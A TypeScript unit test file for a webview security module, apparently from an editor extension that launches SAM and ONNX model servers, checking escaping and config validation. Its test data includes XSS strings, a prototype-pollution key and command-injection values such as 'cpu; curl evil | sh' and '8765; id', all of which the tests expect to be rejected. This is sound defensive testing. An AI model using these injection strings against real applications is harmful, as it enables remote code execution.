import { describe, it } from 'node:test';
import * as assert from 'node:assert/strict';
import * as vm from 'node:vm';
import {
    serializeForScript,
    escapeHtml,
    isValidGlobalSetting,
    sanitizeStoredSetting,
    stripTrailingSeparators,
    validateOnnxLaunchConfig,
    validateSamLaunchConfig
} from '../src/webviewSecurity';

describe('serializeForScript', () => {
    it('cannot close the surrounding <script> element', () => {
        const out = serializeForScript({ label: '</script><script>alert(1)</script>' });
        assert.ok(!out.includes('<'));
        assert.ok(!out.includes('>'));
    });

    it('round-trips to the same value when evaluated as JS', () => {
        const value = {
            label: '</script><!-- & "q" \'s\' \u2028\u2029',
            path: 'C:\\data\\a".png',
            n: [1, 2.5, null],
        };
        const out = serializeForScript(value);
        // vm objects have foreign prototypes; compare via a JSON round-trip.
        assert.deepEqual(JSON.parse(JSON.stringify(vm.runInNewContext(`(${out})`))), value);
        assert.deepEqual(JSON.parse(out), value);
    });

    it('emits null for undefined', () => {
        assert.equal(serializeForScript(undefined), 'null');
    });
});

describe('escapeHtml', () => {
    it('escapes markup and quote characters', () => {
        assert.equal(escapeHtml(`<img src=x onerror="a('b')">&`),
            '&lt;img src=x onerror=&quot;a(&#39;b&#39;)&quot;&gt;&amp;');
    });
});

describe('isValidGlobalSetting', () => {
    it('accepts known keys with the right type', () => {
        assert.equal(isValidGlobalSetting('theme', 'dark'), true);
        assert.equal(isValidGlobalSetting('borderWidth', 3), true);
        assert.equal(isValidGlobalSetting('recentLabels', ['a', 'b']), true);
        assert.equal(isValidGlobalSetting('customColors', { cat: '#ff0000' }), true);
        assert.equal(isValidGlobalSetting('keyboardBindings', null), true);
        assert.equal(isValidGlobalSetting('keyboardBindings', { 'edit.undo': { key: 'Z', ctrl: true }, 'edit.merge': null }), true);
        assert.equal(isValidGlobalSetting('samPort', 8765), true);
        assert.equal(isValidGlobalSetting('onnxGpuIndex', -1), true);
    });

    it('rejects unknown keys, including extension-owned ones', () => {
        assert.equal(isValidGlobalSetting('samAuthToken', 'x'), false);
        assert.equal(isValidGlobalSetting('exportOutputDir', '/tmp'), false);
        assert.equal(isValidGlobalSetting('__proto__', {}), false);
        assert.equal(isValidGlobalSetting(42, 1), false);
    });

    it('rejects values of the wrong type or outside the allowed set', () => {
        assert.equal(isValidGlobalSetting('theme', '"</script>'), false);
        assert.equal(isValidGlobalSetting('borderWidth', '2; alert(1)'), false);
        assert.equal(isValidGlobalSetting('borderWidth', NaN), false);
        assert.equal(isValidGlobalSetting('samPort', 70000), false);
        assert.equal(isValidGlobalSetting('onnxGpuIndex', NaN), false);
        assert.equal(isValidGlobalSetting('recentLabels', ['a', 1]), false);
        assert.equal(isValidGlobalSetting('keyboardBindings', { 'edit.undo': { ctrl: true } }), false);
    });
});

describe('sanitizeStoredSetting', () => {
    it('returns the stored value when valid, the fallback otherwise', () => {
        assert.equal(sanitizeStoredSetting('theme', 'light', 'auto'), 'light');
        assert.equal(sanitizeStoredSetting('theme', 'x";alert(1);"', 'auto'), 'auto');
        assert.equal(sanitizeStoredSetting('borderWidth', undefined, 2), 2);
    });
});

describe('stripTrailingSeparators', () => {
    it('drops trailing separators but keeps roots', () => {
        assert.equal(stripTrailingSeparators('D:\\models\\'), 'D:\\models');
        assert.equal(stripTrailingSeparators('/m/sam//'), '/m/sam');
        assert.equal(stripTrailingSeparators('/'), '/');
        assert.equal(stripTrailingSeparators('C:\\'), 'C:\\');
        assert.equal(stripTrailingSeparators('/m/sam'), '/m/sam');
    });
});

describe('validateOnnxLaunchConfig', () => {
    const good = { modelDir: '/m/', pythonPath: '', device: 'gpu', colorFormat: 'bgr', mode: 'merge', scope: 'all', gpuIndex: 1 };

    it('accepts and normalises a valid config', () => {
        const r = validateOnnxLaunchConfig(good);
        assert.ok(r.ok);
        assert.equal(r.value.modelDir, '/m');
        assert.equal(r.value.pythonPath, 'python');
        assert.equal(r.value.gpuIndex, 1);
    });

    it('rejects injected enum values', () => {
        const r = validateOnnxLaunchConfig({ ...good, device: 'cpu; curl evil | sh' });
        assert.deepEqual(r, { ok: false, error: 'device' });
        assert.equal(validateOnnxLaunchConfig({ ...good, mode: 'x' }).ok, false);
        assert.equal(validateOnnxLaunchConfig({ ...good, colorFormat: 'x' }).ok, false);
        assert.equal(validateOnnxLaunchConfig({ ...good, scope: 'x' }).ok, false);
        assert.equal(validateOnnxLaunchConfig({ ...good, modelDir: '' }).ok, false);
        assert.equal(validateOnnxLaunchConfig(null).ok, false);
    });

    it('treats a NaN gpu index as unset', () => {
        const r = validateOnnxLaunchConfig({ ...good, gpuIndex: NaN });
        assert.ok(r.ok);
        assert.equal(r.value.gpuIndex, undefined);
    });
});

describe('validateSamLaunchConfig', () => {
    const good = { modelDir: '/m', pythonPath: '/usr/bin/python3', device: 'cpu', port: 8765 };

    it('accepts a valid config', () => {
        const r = validateSamLaunchConfig(good);
        assert.ok(r.ok);
        assert.equal(r.value.port, 8765);
    });

    it('rejects a non-integer or out-of-range port', () => {
        assert.deepEqual(validateSamLaunchConfig({ ...good, port: '8765; id' }), { ok: false, error: 'port' });
        assert.equal(validateSamLaunchConfig({ ...good, port: 0 }).ok, false);
        assert.equal(validateSamLaunchConfig({ ...good, port: 65536 }).ok, false);
    });

    it('rejects a non-string python path', () => {
        assert.equal(validateSamLaunchConfig({ ...good, pythonPath: ['x'] }).ok, false);
    });
});
